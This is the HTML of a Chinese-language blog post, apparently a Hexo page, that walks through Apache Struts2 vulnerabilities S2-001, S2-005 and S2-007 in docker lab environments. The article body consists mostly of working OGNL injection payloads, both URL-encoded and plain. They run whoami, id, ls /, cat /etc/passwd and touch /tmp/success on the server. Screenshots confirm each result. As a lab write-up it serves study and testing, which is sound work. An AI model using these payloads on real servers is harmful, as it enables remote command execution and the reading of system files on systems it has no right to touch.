@@ -1,0 +1,2919 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Drunkmars">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Drunkmars">
+    
+        <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="简介Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。St">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2">
+<meta property="og:url" content="http://example.com/2021/03/31/struts2/index.html">
+<meta property="og:site_name" content="Drunkmars">
+<meta property="og:description" content="简介Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。St">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194121665.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194402572.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194409879.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194442932.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194509134.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194549041.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820194639483.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820200045669.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820200240205.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820200345944.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820200826215.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820200921768.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820201027267.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820201039673.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820201543150.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820201932013.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202028600.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202342908.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202445353.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202514897.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202801450.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202815589.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820202858851.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820203053370.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820203124142.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820203720352.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820203833648.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820203847174.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204024530.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204259928.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204533348.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204647284.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204727151.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820204904315.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820205223939.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820210918669.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820211410270.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820211451504.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820211609481.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820211628553.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820211649284.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212145810.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212347293.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212557123.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212611670.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212650254.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212727336.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820212839361.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213057203.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213115650.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213325852.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213334682.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213409774.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213630029.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820213810431.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214026353.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214212397.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214415660.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214546191.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214553104.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214806062.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820214934977.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215031642.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215222307.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215326445.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215341184.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215451870.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820215755513.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820220022589.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820220209093.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820220504947.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820220806755.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820220945285.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820221000578.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820221409313.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820221450189.png">
+<meta property="og:image" content="http://example.com/images/struts2/image-20210820221616015.png">
+<meta property="article:published_time" content="2021-03-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-31T13:13:41.260Z">
+<meta property="article:author" content="Drunkmars">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="中间件">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/struts2/image-20210820194121665.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>struts2 · Drunkmars&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Drunkmars's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Drunkmars&#39;s Blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">struts2</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                struts2
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web渗透">web渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="中间件">中间件</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">6.5k</span>阅读时长: <span class="post-count reading-time">31 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2021/03/31</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Struts2是一个基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/MVC%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/8160955">MVC设计模式</a>的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/4262233">Web应用框架</a>，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/8174145">体系结构</a>与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Servlet">Servlet</a>API完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。</p>
+<h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<p>进入s2-001的docker漏洞环境</p>
+<p><img src="/images/struts2/image-20210820194121665.png" alt="image-20210820194121665"></p>
+<p>首先使用<code>%&#123;&#39;test&#39;&#125;</code>进行测试漏洞是否存在</p>
+<p><img src="/images/struts2/image-20210820194402572.png" alt="image-20210820194402572"></p>
+<p>返回了test，证明存在漏洞</p>
+<p><img src="/images/struts2/image-20210820194409879.png" alt="image-20210820194409879"></p>
+<p>使用payload进行测试，返回了<code>tomcatBinDir&#123;/usr/local/tomcat&#125;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820194442932.png" alt="image-20210820194442932"></p>
+<p>使用payload执行whoami</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820194509134.png" alt="image-20210820194509134"></p>
+<p>使用payload执行<code>cat /etc/password</code>命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> java.io.InputStreamReader(#b),#d=<span class="keyword">new</span> java.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820194549041.png" alt="image-20210820194549041"></p>
+<h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。<br>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
+<p>S2-003 使用\u0023绕过s2对#的防御<br>S2-003 后官方增加了安全模式（沙盒）<br>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</p>
+<p>影响版本: 2.0.0 - 2.1.8.1</p>
+<p>进入s2-005的docker环境</p>
+<p><img src="/images/struts2/image-20210820194639483.png" alt="image-20210820194639483"></p>
+<p>抓包添加payload执行往/tmp/目录下写入success文件的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/images/struts2/image-20210820200045669.png" alt="image-20210820200045669"></p>
+<p>进入docker容器查看，在tmp目录下已经创建了success文件</p>
+<p><img src="/images/struts2/image-20210820200240205.png" alt="image-20210820200240205"></p>
+<h1 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h1><p>在s2-007页面的文本框中，age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</p>
+<p>进入s2-007的docker漏洞环境</p>
+<p><img src="/images/struts2/image-20210820200345944.png" alt="image-20210820200345944"></p>
+<p>执行payload列出当前目录下的所有文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820200826215.png" alt="image-20210820200826215"></p>
+<p>添加payload执行whoami</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27</span>+%2B+%<span class="number">28</span>%23_memberAccess%5B%22allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%<span class="number">28</span>%22false%<span class="number">22</span>%<span class="number">29</span>+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%23foo%2C%40org.apache.commons.io.IOUtils%40toString%<span class="number">28</span>%40java.lang.Runtime%40getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%27whoami%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>+%2B+%<span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/struts2/image-20210820200921768.png" alt="image-20210820200921768"></p>
+<p>也可以直接在age文本框处使用payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExe cution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>id<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/images/struts2/image-20210820201027267.png" alt="image-20210820201027267"></p>
+<p>即可得到id</p>
+<p><img src="/images/struts2/image-20210820201039673.png" alt="image-20210820201039673"></p>
